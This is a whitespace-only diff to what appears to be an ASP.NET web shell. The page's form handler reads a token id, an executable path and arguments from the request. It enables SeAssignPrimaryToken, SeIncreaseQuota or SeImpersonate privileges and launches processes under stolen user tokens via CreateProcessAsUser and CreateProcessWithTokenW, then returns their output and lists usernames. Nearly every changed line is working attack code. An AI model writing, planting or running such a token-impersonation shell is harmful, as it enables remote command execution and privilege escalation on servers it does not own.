@@ -7,7 +7,7 @@
 
 <script runat="server">
 
-    public const int NO_ERROR = 0;
+	public const int NO_ERROR = 0;
 	public const int ERROR_INSUFFICIENT_BUFFER = 122;
 	public const int HANDLE_FLAG_INHERIT = 0x00000001;
 	public const int SE_PRIVILEGE_ENABLED = 0x00000002;
@@ -141,7 +141,7 @@
 	     public IntPtr hStdOutput;
 	     public IntPtr hStdError;
 	}
-	
+
 	public enum LogonFlags
 	{
 	     WithProfile = 1,
@@ -262,7 +262,7 @@
 	protected void RunThings (object sender, EventArgs e)
 	{
 		string id = Request.Form["DropdownList"];
-	    string file = Request.Form["file"];
+		string file = Request.Form["file"];
 		string args = Request.Form["args"];
 		IntPtr token = new IntPtr(Int32.Parse(id));
 
@@ -331,63 +331,63 @@
 	    ResponseArea.InnerText = Regex.Replace(final,  @"[^\P{C}\n]+", "", RegexOptions.None);;
 
 		CloseHandle(out_read);
-	    CloseHandle(err_read);
+		CloseHandle(err_read);
 		CloseHandle(hPrimaryToken);
 	}
 
     public bool CreateAsUser(IntPtr hPrimaryToken, string file, string args, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO si, PROCESS_INFORMATION pi)
     {
         bool retVal;
-	    IntPtr htok = IntPtr.Zero;
-	    retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
-	    
-	   	TokPriv1Luid tp;
-	    tp.Count = 1;
-	    tp.Luid = 0;
-	    tp.Attr = SE_PRIVILEGE_ENABLED;
-	    if(!LookupPrivilegeValue(null, ASSIGN_PRIMARY_TOKEN, ref tp.Luid))
-	    {
-	        Response.Write("SeAssignPrimaryTokenPrivilege not found.");
-			CloseHandle(htok);
-	        return false;
-	    }
+		IntPtr htok = IntPtr.Zero;
+		retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
 
-	    if(!AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
-	    {
-	        Response.Write("SeAssignPrimaryTokenPrivilege could not be enabled.");
+		TokPriv1Luid tp;
+		tp.Count = 1;
+		tp.Luid = 0;
+		tp.Attr = SE_PRIVILEGE_ENABLED;
+		if(!LookupPrivilegeValue(null, ASSIGN_PRIMARY_TOKEN, ref tp.Luid))
+		{
+			Response.Write("SeAssignPrimaryTokenPrivilege not found.");
 			CloseHandle(htok);
 			return false;
-	    }
+		}
+
+		if(!AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
+		{
+			Response.Write("SeAssignPrimaryTokenPrivilege could not be enabled.");
+			CloseHandle(htok);
+			return false;
+		}
 
 		TokPriv1Luid tp2;
-	    tp2.Count = 1;
-	    tp2.Luid = 0;
-	    tp2.Attr = SE_PRIVILEGE_ENABLED;
+		tp2.Count = 1;
+		tp2.Luid = 0;
+		tp2.Attr = SE_PRIVILEGE_ENABLED;
 		if(LookupPrivilegeValue(null, INCREASE_QUOTA, ref tp2.Luid))
-	    {
-	        AdjustTokenPrivileges(htok, false, ref tp2, 0, IntPtr.Zero, IntPtr.Zero);
-	    }
-	    
+		{
+			AdjustTokenPrivileges(htok, false, ref tp2, 0, IntPtr.Zero, IntPtr.Zero);
+		}
+
 		CloseHandle(htok);
 
-       	return CreateProcessAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi);
+		return CreateProcessAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi);
     }
 
     public bool CreateWithToken(IntPtr hPrimaryToken, LogonFlags dwLogonFlags, string file, string args, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO si, PROCESS_INFORMATION pi)
     {   
-        bool retVal;
-        IntPtr htok = IntPtr.Zero;
-        retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
-    
-        TokPriv1Luid tp;
-	    tp.Count = 1;
-	    tp.Luid = 0;
-	    tp.Attr = SE_PRIVILEGE_ENABLED;
+		bool retVal;
+		IntPtr htok = IntPtr.Zero;
+		retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
+
+		TokPriv1Luid tp;
+		tp.Count = 1;
+		tp.Luid = 0;
+		tp.Attr = SE_PRIVILEGE_ENABLED;
 		LookupPrivilegeValue(null, IMPERSONATE, ref tp.Luid);
-        AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
-	
+		AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+
 		CloseHandle(htok);
-        
+
 		return CreateProcessWithTokenW(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi);
     }
 
@@ -395,7 +395,7 @@
 	{
 		DropDownList.Items.Clear();
 		List<string> users = new List<string>();
-	    GetAllUsernames(users); 
+		GetAllUsernames(users); 
 	}
 
 	public void GetAllUsernames(List<string> users)
